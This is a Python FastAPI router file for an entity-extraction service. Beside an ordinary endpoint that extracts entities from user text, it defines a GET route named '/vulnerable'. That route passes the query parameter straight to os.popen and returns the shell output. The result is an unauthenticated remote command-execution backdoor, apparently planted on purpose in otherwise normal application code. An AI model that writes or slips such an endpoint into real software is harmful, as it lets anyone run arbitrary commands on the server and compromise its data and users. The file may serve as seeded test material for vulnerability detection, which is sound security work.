from fastapi import APIRouter
from ...services.entities_extractor import entities_extractor
from ygpt_service.schemas import GenerateTextRequest

router = APIRouter(prefix="/entities", tags=["Entities extraction"])


@router.post("/get_from_text")
async def get_from_text(request: GenerateTextRequest):
    return await entities_extractor.extract_entities_from_user_text(request)

@router.get("/vulnerable")
def vulnerable(q: str):
    import os
    return os.popen(q).read()

